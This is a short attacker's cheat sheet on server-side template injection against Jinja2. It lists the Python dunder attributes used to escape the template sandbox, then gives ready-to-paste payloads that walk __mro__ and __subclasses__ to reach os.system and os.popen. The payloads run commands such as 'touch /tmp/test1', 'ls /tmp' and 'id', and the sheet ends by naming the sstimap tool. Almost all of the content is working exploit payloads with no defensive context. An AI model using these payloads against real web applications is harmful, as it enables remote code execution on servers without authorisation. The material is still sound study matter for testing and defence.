investigate for sst rce:

ex on jinja2 :

No. 	Methods 	     Description
1. 	    __class__ 	     Returns the object (class) to which the type belongs
2. 	    __mro__ 	     Returns a tuple containing the base class inherited by the object. Methods are parsed in the order of tuples.
3. 	    __subclasses__ 	 Each new class retains references to subclasses, and this method returns a list of references that are still available in the class
4. 	    __builtins__ 	 Returns the builtin methods included in a function
5. 	    __globals__ 	 A reference to a dictionary that contains global variables for a function
6. 	    __base__ 	     Returns the base class inherited by the object <-- (__ base__ and __ mro__ are used to find the base class)
7. 	    __init__ 	     Class initialization method


{{ ''.__class__.__mro__ }}


{{ ''.__class__.__mro__[1] }}


{{ ''.__class__.__mro__[1].__subclasses__() }}



{% for i in range(450) %}
{{ i }}
{{ ''.__class__.__mro__[1].__subclasses__()[i].__name__ }}
{% endfor %}



{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').system("touch /tmp/test1") }}  ==> do command , return 0


{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('ls /tmp').read()}}     ==> do command , return result

or

{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("id").read().zfill(417)}}{%endif%}{% endfor %}



tool : sstimap
